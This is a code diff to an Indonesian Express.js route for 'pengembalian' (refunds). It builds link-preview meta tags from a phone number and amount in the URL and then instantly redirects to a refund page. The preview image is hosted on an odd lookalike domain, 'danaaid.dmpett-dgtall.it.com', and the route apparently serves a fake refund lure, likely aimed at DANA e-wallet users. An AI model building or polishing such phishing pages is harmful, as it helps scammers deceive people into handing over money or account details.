@@ -699,22 +699,94 @@ app.get("/pengembalian/:phone/:nominal", (req, res) => {
 
     // Validasi sederhana
     if (!phone || !nominal) {
-        return res.status(400).send("Data pengembalian tidak lengkap");
+        return res.status(400).send(
+            "Data pengembalian tidak lengkap"
+        );
     }
 
     // Nomor hanya angka
     if (!/^\d+$/.test(phone)) {
-        return res.status(400).send("Nomor tidak valid");
+        return res.status(400).send(
+            "Nomor tidak valid"
+        );
     }
 
     // Nominal hanya angka dan titik
     if (!/^[0-9.]+$/.test(nominal)) {
-        return res.status(400).send("Nominal tidak valid");
+        return res.status(400).send(
+            "Nominal tidak valid"
+        );
     }
 
-    res.sendFile(
-        path.join(__dirname, "pengembalian.html")
-    );
+
+    /* =========================
+       TAMBAHAN BARU
+    ========================= */
+
+    const title =
+        `PENGEMBALIAN ${phone}`;
+
+
+    /* =========================
+       META PREVIEW
+    ========================= */
+
+    res.send(`
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <title>${title}</title>
+
+    <meta
+        property="og:title"
+        content="PENGEMBALIAN ${title}"
+    >
+
+    <meta
+        property="og:description"
+        content="Informasi pengembalian dana"
+    >
+
+    <meta
+        property="og:image"
+        content="https://danaaid.dmpett-dgtall.it.com/assets/preview-pengembalian.jpg"
+    >
+
+    <meta
+        property="og:type"
+        content="website"
+    >
+
+    <meta
+        name="twitter:card"
+        content="summary_large_image"
+    >
+
+    <meta
+        name="twitter:title"
+        content="${title}"
+    >
+
+    <meta
+        name="twitter:image"
+        content="https://danaaid.dmpett-dgtall.it.com/assets/preview-pengembalian.jpg"
+    >
+
+    <meta
+        http-equiv="refresh"
+        content="0;url=/pengembalian.html?phone=${encodeURIComponent(phone)}&nominal=${encodeURIComponent(nominal)}"
+    >
+
+</head>
+
+<body></body>
+
+</html>
+    `);
 
 });
 
